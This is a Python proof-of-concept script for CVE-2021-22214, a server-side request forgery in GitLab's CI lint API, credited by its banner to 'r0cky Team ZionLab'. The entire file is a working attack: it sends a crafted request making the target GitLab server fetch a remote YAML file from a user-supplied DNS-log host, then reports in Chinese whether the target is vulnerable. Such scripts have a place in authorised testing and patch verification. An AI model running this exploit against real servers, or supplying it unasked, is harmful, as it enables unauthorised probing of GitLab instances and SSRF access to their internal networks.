#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Author: r0cky
@Time: 2021/6/22-11:09
"""
import json
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    print("""
===============================================================
   _____ _ _   _           _        _____ _____ _____  ______ 
  / ____(_) | | |         | |      / ____/ ____|  __ \|  ____|
 | |  __ _| |_| |     __ _| |__   | (___| (___ | |__) | |__   
 | | |_ | | __| |    / _` | '_ \   \___ \\___ \|  _  /|  __|  
 | |__| | | |_| |___| (_| | |_) |  ____) |___) | | \ \| |     
  \_____|_|\__|______\__,_|_.__/  |_____/_____/|_|  \_\_|     

   CVE-2021-22214              Powered by r0cky Team ZionLab
===============================================================
""")

def poc(url, dnshost):

    api="/api/v4/ci/lint"
    data = {"include_merged_yaml": True, "content": "include:\n  remote: http://{}/api/v1/targets?test.yml".format(dnshost)}

    headers = {"Content-Type": "application/json"}

    r = requests.post(url=url+api, data=json.dumps(data), headers=headers, verify=False)
    if r.status_code == 200:
        if dnshost in r.json()["errors"][0]:
            print ("[+] 可能存在 GitLab SSRF 漏洞，请查看dnslog记录.")
            return
    print ("[-] 不存在 GitLab SSRF 漏洞！")

def main():
    banner()
    if (len(sys.argv) == 3):
        url = sys.argv[1]
        dnshost = sys.argv[2]
        poc(url, dnshost)
    else:
        print("Example: \n    python3 " + sys.argv[0] + " <target> <dnshost>\n")

if __name__ == '__main__':
    main()